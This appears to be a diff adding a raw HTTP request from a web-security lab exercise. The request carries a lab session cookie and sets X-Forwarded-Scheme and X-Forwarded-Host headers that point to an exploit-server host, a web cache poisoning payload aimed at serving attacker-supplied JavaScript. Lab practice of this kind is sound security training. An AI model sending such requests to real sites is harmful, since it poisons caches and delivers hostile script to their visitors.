@@ -1,0 +1,10 @@
+
+
+
+
+
+GET /resources/js/tracking.js HTTP/2
+Host: 0a3900cc039b3d3882d0d82e00d900fc.web-security-academy.net
+Cookie: session=mbBWjGqbi1OsNledlgcvWiIUhzfUfrz5
+X-Forwarded-Scheme: HTTP
+X-Forwarded-Host: exploit-0a41001f03c73d158248d7d201420075.exploit-server.net
